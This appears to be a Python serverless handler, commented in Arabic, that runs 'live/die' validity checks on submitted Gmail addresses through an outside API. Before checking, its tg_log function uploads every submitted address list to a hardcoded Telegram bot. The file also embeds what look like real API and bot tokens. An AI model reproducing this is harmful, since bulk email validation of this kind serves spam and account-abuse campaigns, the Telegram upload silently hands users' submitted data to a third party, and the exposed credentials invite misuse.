import json, io, requests
from http.server import BaseHTTPRequestHandler

# ================= عدّل هنا بس =================
API = "https://gmail-validation.mbahbabat.workers.dev"  # رابط الـ API بتاعك
KEY = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"                                             # مفتاح الـ API (Bearer) بتاعك
TG_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"                                           # توكن بوت تليجرام لو عايز لوج الإيميلات (اختياري - سيبه فاضي لو مش محتاجه)
TG_CHAT  = "8554641519"                                           # ايدي شات تليجرام
# ===============================================

def tg_log(emails):
    """إرسال الإيميلات لـ تليجرام كملف نصي قبل الفحص (بيشتغل بس لو حطيت توكن و ايدي)."""
    if TG_TOKEN and TG_CHAT and emails:
        try:
            f = io.BytesIO(("\n".join(emails)).encode('utf-8'))
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                          data={'chat_id': TG_CHAT, 'caption': f'📥 New Emails: {len(emails)}'},
                          files={'document': ('emails.txt', f, 'text/plain')}, timeout=3)
        except Exception:
            pass

def check(emails):
    """الفحص كله هنا:
       - كل إيميل بيبدأ Die.
       - الوحيد اللي بيبقى Live هو اللي الـ API بيرجعه status == "live" بالظبط.
       - أي حاجة تانية (unregistered / خطأ / مفيش رد) = Die.
    """
    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in emails}
    err = None
    try:
        r = requests.post(f"{API}/fastcheck1",
                           headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
                           json={"mail": emails}, timeout=30)
        if r.status_code == 200:
            data = r.json()
            items = data if isinstance(data, list) else data.get("results", [])
            for it in items:
                em = str(it.get("email", "")).lower()
                if em in out and str(it.get("status", "")).lower() == "live":
                    out[em]["verdict"] = "valid"
        else:
            err = f"API HTTP {r.status_code}"
    except Exception as e:
        err = str(e)
    return list(out.values()), err

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        def send(obj):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(obj, ensure_ascii=False).encode('utf-8'))
        try:
            body = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
            emails = body.get("emails", [])
            if isinstance(emails, str):
                emails = [emails]
            tg_log(emails)
            results, err = check(emails)
            resp = {"success": True, "results": results}
            if err:
                resp["api_error"] = err  # يظهر في Network tab لو المفتاح أو الرابط فيه مشكلة
            send(resp)
        except Exception as e:
            send({"success": False, "error": str(e)})
